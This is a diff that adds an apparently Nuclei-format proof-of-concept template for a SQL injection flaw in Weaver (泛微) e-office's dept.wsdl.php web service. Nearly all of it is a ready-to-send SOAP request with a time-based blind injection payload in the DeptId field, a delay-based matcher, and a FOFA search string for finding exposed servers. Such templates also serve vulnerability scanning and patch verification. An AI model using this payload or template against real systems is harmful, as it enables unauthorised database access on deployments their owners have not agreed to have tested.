@@ -1,0 +1,22 @@
+id: poc-anfb1o8p3idvfgu6
+info:
+  name: 泛微e-office dept.wsdl.php存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/anfb1o8p3idvfgu6
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: anfb1o8p3idvfgu6
+    fofa: app="泛微-EOffice"
+http:
+- raw:
+  - "POST /webservice-json/dept/dept.wsdl.php HTTP/1.1\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,\nlike Gecko) Chrome/91.0.4472.77 Safari/537.36\nConnection: keep-alive\nSOAPAction: urn:DepartmentServicewsdl#DeleteDept\nContent-Type: text/xml;charset=UTF-8\nsleep: sleep\n\n<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:DepartmentServicewsdl\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <urn:DeleteDept soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n <DeptId xsi:type=\"xsd:string\">gero' AND 2462=BENCHMARK(2000000,MD5(0x65486473))-- rXUd</DeptId>\n      </urn:DeleteDept>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
